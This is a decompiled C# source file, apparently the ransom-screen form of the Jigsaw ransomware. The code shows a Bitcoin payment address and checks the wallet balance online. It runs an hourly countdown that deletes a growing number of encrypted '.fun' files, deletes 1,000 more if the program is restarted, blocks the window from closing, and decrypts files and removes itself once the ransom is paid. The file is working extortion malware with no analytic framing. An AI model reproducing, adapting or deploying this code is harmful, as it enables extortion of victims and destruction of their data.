using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Main.Properties;
using Main.Tools;

namespace Main;

public class FormGame : Form
{
	private static int _timeLeftSec;

	private static int _exponent;

	private const double Base = 1.1;

	private static int _indexNum;

	private IContainer components;

	private Label labelWelcome;

	private Timer timerTypingEffect;

	private Label labelTask;

	private TextBox textBoxAddress;

	private Button buttonCheckPayment;

	private Button buttonViewEncryptedFiles;

	private Timer timerCountDown;

	private Label labelCountDown;

	private Label labelFilesToDelete;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public FormGame()
	{
		InitializeComponent();
	}

	private void FormGame_Load(object sender, EventArgs e)
	{
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		Windows.MakeTopMost((Form)(object)this);
		timerTypingEffect.set_Interval(125);
		timerTypingEffect.set_Enabled(true);
		((Control)labelWelcome).set_Text("");
		((Control)labelTask).set_Text(Config.TaskMessage);
		((Control)labelTask).set_Visible(false);
		((TextBoxBase)textBoxAddress).set_ReadOnly(true);
		((Control)textBoxAddress).set_Text(GetBitcoinAddess());
		((Control)textBoxAddress).set_Visible(false);
		((Control)buttonCheckPayment).set_Visible(false);
		((Control)buttonViewEncryptedFiles).set_Visible(false);
		((Control)labelCountDown).set_Visible(false);
		timerCountDown.set_Enabled(false);
		((Control)labelFilesToDelete).set_Visible(false);
		if (DidRun())
		{
			DeleteFiles(1000);
		}
	}

	private static bool DidRun()
	{
		string path = Path.Combine(Config.WorkFolderPath, "dr");
		if (File.Exists(path))
		{
			return true;
		}
		File.WriteAllText(path, "21");
		return false;
	}

	private static void DeleteFiles(int num)
	{
		try
		{
			int num2 = 0;
			foreach (string encryptedFile in Locker.GetEncryptedFiles())
			{
				if (num2 == num)
				{
					break;
				}
				File.Delete(encryptedFile + ".fun");
				num2++;
			}
		}
		catch (Exception)
		{
		}
	}

	private static string GetBitcoinAddess()
	{
		string path = Path.Combine(Config.WorkFolderPath, "Address.txt");
		if (File.Exists(path))
		{
			return File.ReadAllText(path);
		}
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Resources.vanityAddresses.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		string text = hashSet.OrderBy((string x) => Guid.NewGuid()).FirstOrDefault();
		File.WriteAllText(path, text);
		return text;
	}

	private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)e).Cancel = true;
		MessageBox.Show((IWin32Window)(object)this, "You are about to make a very bad decision. Are you sure about it?");
	}

	private void timerTypingEffect_Tick(object sender, EventArgs e)
	{
		string welcomeMessage = Config.WelcomeMessage;
		((Control)labelWelcome).set_Text(welcomeMessage.Substring(0, _indexNum) + "_");
		_indexNum++;
		if (_indexNum == welcomeMessage.Length + 1)
		{
			timerTypingEffect.set_Enabled(false);
			((Control)labelTask).set_Visible(true);
			((Control)textBoxAddress).set_Visible(true);
			((Control)buttonCheckPayment).set_Visible(true);
			((Control)buttonViewEncryptedFiles).set_Visible(true);
			((Control)labelCountDown).set_Visible(true);
			timerCountDown.set_Enabled(true);
			((Control)labelFilesToDelete).set_Visible(true);
			_timeLeftSec = 3600;
		}
	}

	private void buttonCheckPayment_Click(object sender, EventArgs e)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double price = Blockr.GetPrice();
			int num = (int)(Blockr.GetBalanceBtc(GetBitcoinAddess()) * price);
			if (num > Config.RansomUsd)
			{
				timerCountDown.Stop();
				((Control)buttonCheckPayment).set_Enabled(false);
				((Control)buttonCheckPayment).set_BackColor(Color.Lime);
				((Control)buttonCheckPayment).set_Text("Great job, I'm decrypting your files...");
				MessageBox.Show((IWin32Window)(object)this, "Decrypting your files. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
				Locker.DecryptFiles(".fun");
				Hacking.RemoveItself();
			}
			else if (num > 0)
			{
				((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
				((Control)buttonCheckPayment).set_Text("You did not sent me enough! Try again!");
			}
			else
			{
				((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
				((Control)buttonCheckPayment).set_Text("You haven't made payment yet! Try again!");
			}
		}
		catch
		{
			((Control)buttonCheckPayment).set_Text("Are you connected to the internet? Try again!");
			((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
		}
	}

	private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
	{
		((Form)new FormEncryptedFiles()).Show((IWin32Window)(object)this);
	}

	private void timerCountDown_Tick(object sender, EventArgs e)
	{
		if (_timeLeftSec > 0)
		{
			_timeLeftSec--;
			int num = _timeLeftSec / 60;
			int num2 = _timeLeftSec % 60;
			((Control)labelCountDown).set_Text(num + ":" + num2);
		}
		else
		{
			_timeLeftSec = 3600;
			int num3 = (int)Math.Pow(1.1, _exponent);
			((Control)labelFilesToDelete).set_Text(num3 + " files will be deleted");
			_exponent++;
			DeleteFiles(num3);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_0451: Unknown result type (might be due to invalid IL or missing references)
		//IL_045b: Expected O, but got Unknown
		//IL_058b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0595: Expected O, but got Unknown
		components = new Container();
		labelWelcome = new Label();
		timerTypingEffect = new Timer(components);
		labelTask = new Label();
		textBoxAddress = new TextBox();
		buttonCheckPayment = new Button();
		buttonViewEncryptedFiles = new Button();
		timerCountDown = new Timer(components);
		labelCountDown = new Label();
		labelFilesToDelete = new Label();
		((Control)this).SuspendLayout();
		((Control)labelWelcome).set_AutoSize(true);
		((Control)labelWelcome).set_BackColor(Color.Black);
		((Control)labelWelcome).set_Font(new Font("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)labelWelcome).set_ForeColor(Color.Lime);
		((Control)labelWelcome).set_Location(new Point(25, 29));
		((Control)labelWelcome).set_Name("labelWelcome");
		((Control)labelWelcome).set_Size(new Size(218, 16));
		((Control)labelWelcome).set_TabIndex(0);
		((Control)labelWelcome).set_Text("I want to play a game");
		timerTypingEffect.add_Tick((EventHandler)timerTypingEffect_Tick);
		((Control)labelTask).set_AutoSize(true);
		((Control)labelTask).set_BackColor(Color.Black);
		((Control)labelTask).set_Font(new Font("Lucida Console", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelTask).set_ForeColor(Color.Lime);
		((Control)labelTask).set_Location(new Point(25, 505));
		((Control)labelTask).set_Name("labelTask");
		((Control)labelTask).set_Size(new Size(239, 16));
		((Control)labelTask).set_TabIndex(1);
		((Control)labelTask).set_Text("All you have to do...");
		((Control)textBoxAddress).set_Location(new Point(28, 524));
		((Control)textBoxAddress).set_Name("textBoxAddress");
		((Control)textBoxAddress).set_Size(new Size(348, 20));
		((Control)textBoxAddress).set_TabIndex(2);
		((Control)textBoxAddress).set_Text("12Xspzstah37626slkwKhsKSHA");
		((Control)buttonCheckPayment).set_BackColor(Color.Gold);
		((Control)buttonCheckPayment).set_Location(new Point(28, 551));
		((Control)buttonCheckPayment).set_Name("buttonCheckPayment");
		((Control)buttonCheckPayment).set_Size(new Size(348, 33));
		((Control)buttonCheckPayment).set_TabIndex(3);
		((Control)buttonCheckPayment).set_Text("I made a payment, now give me back my files!");
		((ButtonBase)buttonCheckPayment).set_UseVisualStyleBackColor(false);
		((Control)buttonCheckPayment).add_Click((EventHandler)buttonCheckPayment_Click);
		((Control)buttonViewEncryptedFiles).set_BackColor(Color.Gray);
		((Control)buttonViewEncryptedFiles).set_Location(new Point(28, 479));
		((Control)buttonViewEncryptedFiles).set_Name("buttonViewEncryptedFiles");
		((Control)buttonViewEncryptedFiles).set_Size(new Size(348, 23));
		((Control)buttonViewEncryptedFiles).set_TabIndex(4);
		((Control)buttonViewEncryptedFiles).set_Text("View encrypted files");
		((ButtonBase)buttonViewEncryptedFiles).set_UseVisualStyleBackColor(false);
		((Control)buttonViewEncryptedFiles).add_Click((EventHandler)buttonViewEncryptedFiles_Click);
		timerCountDown.set_Interval(1000);
		timerCountDown.add_Tick((EventHandler)timerCountDown_Tick);
		((Control)labelCountDown).set_AutoSize(true);
		((Control)labelCountDown).set_BackColor(Color.Black);
		labelCountDown.set_BorderStyle((BorderStyle)2);
		((Control)labelCountDown).set_Font(new Font("Lucida Sans Unicode", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelCountDown).set_ForeColor(Color.DarkRed);
		((Control)labelCountDown).set_Location(new Point(28, 320));
		((Control)labelCountDown).set_Name("labelCountDown");
		((Control)labelCountDown).set_Size(new Size(220, 80));
		((Control)labelCountDown).set_TabIndex(5);
		((Control)labelCountDown).set_Text("59:59");
		((Control)labelFilesToDelete).set_AutoSize(true);
		((Control)labelFilesToDelete).set_BackColor(Color.Black);
		((Control)labelFilesToDelete).set_Font(new Font("Lucida Console", 12f, (FontStyle)1));
		((Control)labelFilesToDelete).set_ForeColor(Color.Lime);
		((Control)labelFilesToDelete).set_Location(new Point(24, 455));
		((Control)labelFilesToDelete).set_Name("labelFilesToDelete");
		((Control)labelFilesToDelete).set_Size(new Size(261, 16));
		((Control)labelFilesToDelete).set_TabIndex(6);
		((Control)labelFilesToDelete).set_Text("1 file will be deleted.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.Jigsaw);
		((Form)this).set_ClientSize(new Size(840, 596));
		((Control)this).get_Controls().Add((Control)(object)labelFilesToDelete);
		((Control)this).get_Controls().Add((Control)(object)labelCountDown);
		((Control)this).get_Controls().Add((Control)(object)buttonViewEncryptedFiles);
		((Control)this).get_Controls().Add((Control)(object)buttonCheckPayment);
		((Control)this).get_Controls().Add((Control)(object)textBoxAddress);
		((Control)this).get_Controls().Add((Control)(object)labelTask);
		((Control)this).get_Controls().Add((Control)(object)labelWelcome);
		((Control)this).set_Name("FormGame");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FormGame_FormClosing));
		((Form)this).add_Load((EventHandler)FormGame_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
